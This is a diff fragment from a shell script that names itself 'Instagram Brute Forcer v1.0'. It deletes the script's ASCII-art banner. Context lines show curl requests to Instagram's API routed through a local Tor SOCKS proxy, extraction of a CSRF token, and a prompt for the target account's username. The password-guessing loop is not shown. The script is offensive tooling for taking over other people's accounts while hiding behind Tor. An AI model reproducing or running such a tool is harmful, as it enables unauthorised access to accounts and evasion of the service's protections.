@@ -28,18 +28,6 @@ var0=$(curl --socks5 localhost:9051 -i -s -H "$header" https://i.instagram.com/a
 var2=$(echo $var0 | grep -o 'csrftoken=.*' | cut -d ';' -f1 | cut -d '=' -f2)
 
 
-banner() {
-
-printf "\e[1;95m  _              _            \e[0m\e[1;91m_____                                  \e[0m\n"
-printf "\e[1;95m (_) _ __   ___ | |_   __ _   \e[0m\e[1;91m\_   \ _ __   ___   __ _  _ __    ___  \e[0m\n"
-printf "\e[1;95m | || '_ \ / __|| __| / _\` |   \e[0m\e[1;91m/ /\/| '_ \ / __| / _\` || '_ \  / _ \ \e[0m\n"
-printf "\e[1;95m | || | | |\__ \| |_ | (_| |\e[0m\e[1;91m/\/ /_  | | | |\__ \| (_| || | | ||  __/ \e[0m\n"
-printf "\e[1;77m |_||_| |_||___/ \__| \__,_|\e[0m\e[1;77m\____/  |_| |_||___/ \__,_||_| |_| \___| \e[0m\n"
-printf "\n"
-printf "\e[1;77m\e[41m  Instagram Brute Forcer v1.0, Author: @thelinuxchoice (Github/IG)  \e[0m\n" #Don't change, noob
-printf "\n"
-}
-
 
 function start() {
 read -p $'\e[1;92mUsername account: \e[0m' user
